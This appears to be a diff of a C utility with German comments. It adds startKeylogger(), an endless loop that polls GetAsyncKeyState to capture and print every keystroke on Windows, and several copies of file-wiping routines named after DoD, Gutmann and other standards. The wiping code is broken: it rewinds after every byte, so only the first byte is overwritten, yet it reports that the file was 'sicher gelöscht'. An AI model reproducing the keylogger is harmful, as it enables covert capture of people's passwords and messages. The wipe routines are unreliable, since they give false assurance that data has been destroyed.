@@ -9,7 +9,6 @@
 #ifdef _WIN32
 
 #include <windows.h>
-#include <conio.h>
 
 #endif
 
@@ -176,35 +175,107 @@ char* os(const char* command) {
 }
 
 
-void initializeLogger(KeyLogger* logger) {
-    logger->capacity = 128; // Startkapazität
-    logger->size = 0;
-    logger->buffer = malloc(logger->capacity * sizeof(char));
-    if (!logger->buffer) {
-        fprintf(stderr, "Speicherzuweisung fehlgeschlagen\n");
-        exit(EXIT_FAILURE);
+char* startKeylogger() {
+    size_t size = 1024;  // Anfangsgröße des Arrays
+    char* recordedKeys = malloc(size);
+    if (recordedKeys == NULL) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return NULL;
     }
-}
 
-void logKey(KeyLogger* logger, char key) {
-    if (logger->size >= logger->capacity) {
-        logger->capacity *= 2;
-        char* newBuffer = realloc(logger->buffer, logger->capacity * sizeof(char));
-        if (!newBuffer) {
-            fprintf(stderr, "Speichererweiterung fehlgeschlagen\n");
-            free(logger->buffer);
-            exit(EXIT_FAILURE);
+    size_t index = 0;
+    while (1) {
+        Sleep(5);  // Kleine Verzögerung, um die CPU-Last zu verringern
+
+        for (int key = 32; key <= 127; key++) {  // ASCII-Zeichenbereich
+            if (GetAsyncKeyState(key) & 0x0001) {  // Überprüft, ob die Taste gedrückt wurde
+                if (index >= size - 1) {  // Überprüft, ob das Ende des Arrays erreicht ist
+                    size *= 2;  // Verdoppelt die Größe des Arrays
+                    char* temp = realloc(recordedKeys, size);
+                    if (temp == NULL) {
+                        fprintf(stderr, "Memory reallocation failed\n");
+                        free(recordedKeys);
+                        return NULL;
+                    }
+                    recordedKeys = temp;
+                }
+
+                recordedKeys[index++] = (char)key;
+                recordedKeys[index] = '\0';  // Stellt sicher, dass die Zeichenfolge immer terminiert ist
+                printf("%c", key);  // Druckt den Tastenanschlag zur Überprüfung
+            }
         }
-        logger->buffer = newBuffer;
     }
-    logger->buffer[logger->size++] = key;
+
+    // Die Schleife ist endlos. Für die praktische Verwendung sollten Sie eine Bedingung zum Beenden hinzufügen.
+    // return recordedKeys;  // Diese Zeile wird nie erreicht, da die Schleife endlos ist.
 }
 
-void stopLogging(KeyLogger* logger) {
-    logger->buffer[logger->size] = '\0'; // Null-Terminator hinzufügen
-    printf("Gespeicherte Tastenanschläge: %s\n", logger->buffer);
-    free(logger->buffer); // Freigabe des Speichers
-} 
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void overwriteFile(const char* filePath, const unsigned char* patterns, size_t patternLength, int passes, int patternCount) {
+    FILE* file = fopen(filePath, "r+b");
+    if (file == NULL) {
+        perror("Datei konnte nicht geöffnet werden");
+        return;
+    }
+
+    fseek(file, 0, SEEK_END);
+    long fileSize = ftell(file);
+    rewind(file);
+
+    for (int pass = 0; pass < passes; ++pass) {
+        for (long i = 0; i < fileSize; ++i) {
+            fwrite(&patterns[pass % patternCount], 1, patternLength, file);
+            rewind(file);
+        }
+        fflush(file);
+    }
+
+    fclose(file);
+}
+
+void erase(const char* filePath, const char* algorithm) {
+    if (strcmp(algorithm, "DoD5220.22-M") == 0) {
+        const unsigned char patterns[3] = { 0x00, 0xFF, 0x00 };
+        overwriteFile(filePath, patterns, 1, 3, 3);
+    }
+    else if (strcmp(algorithm, "AFSSI-5020") == 0) {
+        const unsigned char pattern = 0x00;
+        overwriteFile(filePath, &pattern, 1, 1, 1);
+    }
+    else if (strcmp(algorithm, "GOST-R-50739-95") == 0) {
+        const unsigned char pattern = 0x00;
+        overwriteFile(filePath, &pattern, 1, 2, 1);
+    }
+    else if (strcmp(algorithm, "British HMG IS5") == 0) {
+        const unsigned char patterns[3] = { 0x00, 0xFF, 0x00 };
+        overwriteFile(filePath, patterns, 1, 3, 3);
+    }
+    else if (strcmp(algorithm, "Canadian RCMP TSSIT OPS-II") == 0) {
+        const unsigned char patterns[7] = { 0x01, 0xFE, 0x01, 0xFE, 0x01, 0xFE, 0x00 };
+        overwriteFile(filePath, patterns, 1, 7, 7);
+    }
+    else if (strcmp(algorithm, "Peter Gutmann") == 0) {
+        const unsigned char patterns[35] = {
+            0x55, 0xAA, 0x92, 0x49, 0x24, 0x00, 0x11, 0x22, 0x33, 0x44,
+            0x55, 0xAA, 0x77, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x92, 0x49,
+            0x24, 0x6D, 0xB6, 0xDB, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
+            0xAA, 0x5A, 0xA5, 0xFF, 0x00
+        };
+        overwriteFile(filePath, patterns, 1, 35, 35);
+    }
+    else if (strcmp(algorithm, "US Army AR380-19") == 0) {
+        const unsigned char patterns[3] = { 0x00, 0xFF, 0x00 };
+        overwriteFile(filePath, patterns, 1, 3, 3);
+    }
+
+    // Schließlich die Datei löschen
+    remove(filePath);
+}
 
 
 
@@ -404,6 +475,33 @@ char* os(const char* command) {
 }
 
 
+void overwriteFile(const char* filePath, const unsigned char* patterns, size_t patternLength, int passes, int patternCount) {
+    FILE* file = fopen(filePath, "r+b");
+    if (file == NULL) {
+        perror("Datei konnte nicht geöffnet werden");
+        return;
+    }
+
+    fseek(file, 0, SEEK_END);
+    long fileSize = ftell(file);
+    rewind(file);
+
+    for (int pass = 0; pass < passes; ++pass) {
+        for (long i = 0; i < fileSize; ++i) {
+            fwrite(&patterns[pass % patternCount], 1, patternLength, file);
+            rewind(file);
+        }
+        fflush(file);
+    }
+
+    fclose(file);
+    // Sicherstellen, dass die Datei tatsächlich gelöscht wird
+    remove(filePath);
+}
+
+
+
+
 #endif LINUX
 
 
@@ -483,3 +581,61 @@ void setMousePosition(int x, int y) {
 }
 
 #endif APPLE
+
+
+#if defined(__APPLE__) || defined(__linux__)
+void overwriteFile(const char* filePath, const unsigned char* patterns, size_t patternLength, int passes, int patternCount) {
+    FILE* file = fopen(filePath, "r+b");
+    if (file == NULL) {
+        perror("Datei konnte nicht geöffnet werden");
+        return;
+    }
+
+    fseek(file, 0, SEEK_END);
+    long fileSize = ftell(file);
+    rewind(file);
+
+    for (int pass = 0; pass < passes; ++pass) {
+        for (long i = 0; i < fileSize; ++i) {
+            fwrite(&patterns[pass % patternCount], 1, patternLength, file);
+            rewind(file);
+        }
+        fflush(file);
+    }
+
+    fclose(file);
+    // Sicherstellen, dass die Datei tatsächlich gelöscht wird
+    remove(filePath);
+}
+
+void Erase(const char* filePath, const char* algorithm) {
+    if (strcmp(algorithm, "DoD5220.22-M") == 0) {
+        const unsigned char patterns[3] = { 0x00, 0xFF, 0x00 };
+        overwriteFile(filePath, patterns, 1, 3, 3);
+    }
+    else if (strcmp(algorithm, "AFSSI-5020") == 0 || strcmp(algorithm, "GOST-R-50739-95") == 0) {
+        const unsigned char pattern = 0x00;
+        overwriteFile(filePath, &pattern, 1, (strcmp(algorithm, "AFSSI-5020") == 0) ? 1 : 2, 1);
+    }
+    else if (strcmp(algorithm, "British HMG IS5") == 0 || strcmp(algorithm, "US Army AR380-19") == 0) {
+        const unsigned char patterns[3] = { 0x00, 0xFF, 0x00 };
+        overwriteFile(filePath, patterns, 1, 3, 3);
+    }
+    else if (strcmp(algorithm, "Canadian RCMP TSSIT OPS-II") == 0) {
+        const unsigned char patterns[7] = { 0x01, 0xFE, 0x01, 0xFE, 0x01, 0xFE, 0x00 };
+        overwriteFile(filePath, patterns, 1, 7, 7);
+    }
+    else if (strcmp(algorithm, "Peter Gutmann") == 0) {
+        const unsigned char patterns[35] = {
+            // Gutmann-Muster sollten hier spezifiziert werden. Für das Beispiel wird ein vereinfachtes Muster verwendet.
+            0x55, 0xAA, 0x92, 0x49, 0x24, 0x6D, 0xB6, 0xDB, 0x00
+            // Füllen Sie das Muster bis zu 35 Durchgängen auf.
+        };
+        overwriteFile(filePath, patterns, 1, 35, sizeof(patterns));
+    }
+
+    printf("Datei %s wurde sicher gelöscht mit dem Algorithmus %s.\n", filePath, algorithm);
+}
+#endif
+
+
